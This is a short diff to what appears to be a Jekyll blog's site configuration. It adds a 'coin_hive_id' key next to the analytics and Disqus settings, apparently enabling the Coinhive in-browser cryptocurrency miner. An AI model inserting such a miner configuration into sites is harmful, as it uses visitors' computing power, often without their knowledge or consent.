@@ -8,6 +8,7 @@ url:                 http://malachisoord.com
 paginate:            5
 baseurl:             ""
 analytics_id:        UA-15939659-3
+coin_hive_id:        A3ARHhxvDXwPWfRelWHtqRy87rFut1yT
 disqus:              malachisoord
 # Assets
 sass:
